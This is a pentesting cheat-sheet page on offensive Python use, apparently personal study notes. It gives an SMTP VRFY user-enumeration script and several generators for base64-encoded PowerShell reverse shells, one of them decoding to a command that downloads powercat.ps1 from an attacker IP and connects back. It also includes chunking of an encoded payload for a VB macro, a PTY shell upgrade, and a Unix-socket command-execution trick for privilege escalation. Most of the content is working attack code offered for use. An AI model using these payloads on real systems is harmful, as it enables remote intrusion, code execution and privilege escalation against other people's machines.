> A high-level, general-purpose programming language.


#File_Sharing

Starting the Python3 webserver using the http.server module
```bash
python3 -m http.server 80
```

#SMTP_Enumeration 

Using Python to script the SMTP user enumeration
```python
#!/usr/bin/python

import socket
import sys

if len(sys.argv) != 3:
        print("Usage: vrfy.py <username> <target_ip>")
        sys.exit(0)

# Create a Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Server
ip = sys.argv[2]
connect = s.connect((ip,25))

# Receive the banner
banner = s.recv(1024)

print(banner)

# VRFY a user
user = (sys.argv[1]).encode()
s.send(b'VRFY ' + user + b'\r\n')
result = s.recv(1024)

print(result)

# Close the socket
s.close()
```
Running the above Python script to perform SMTP user enumeration
```bash
python3 smtp.py root 192.168.69.169
python3 smtp.py hentaisalesman 192.168.69.170
```

#Shell_Access #Remote_Access

Script to create smaller chucks for encoded powershell reverse shell for VB macro
```python
str = "powershell.exe -nop -w hidden -e SUVYKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTkyLjE2OC40NS4yMDEvcG93ZXJjYXQucHMxJyk7cG93ZXJjYXQgLWMgMTkyLjE2OC40NS4yMDEgLXAgNDQ0NCAtZSBwb3dlcnNoZWxsCg=="

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```

Script to generate UTF16 Encoded PowerShell reverse-shell payload
```python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.69.196",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

Script to generate UTF16 Encoded PowerCat download and reverse shell execution
```python
import sys
import base64

payload = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.69.169:8888/powercat.ps1');powercat -c 192.168.69.169 -p 7777 -e cmd"

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

#Full_Interactive_Shell

Spawn /bin/bash using Python’s PTY module and connect the controlling shell with its standard I/O.
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
- pty module spawn a psuedo-terminal that can fool commands like su into thinking they are being executed in a proper terminal.


#Linux_Privilege_Escalation 

Socket binding example with Python (s.py)
```python
import socket
import os, os.path
import time
from collections import deque    

if os.path.exists("/tmp/s"):
  os.remove("/tmp/s")    

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/s")
os.system("chmod o+w /tmp/s")
while True:
  server.listen(1)
  conn, addr = server.accept()
  datagram = conn.recv(1024)
  if datagram:
    print(datagram)
    os.system(datagram)
    conn.close()
```

Socket Command Injection References:
https://github.com/carlospolop/hacktricks/blob/master/linux-hardening/privilege-escalation/socket-command-injection.md
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/socket-command-injection
https://attackdefense.com/challengedetailsnoauth?cid=1384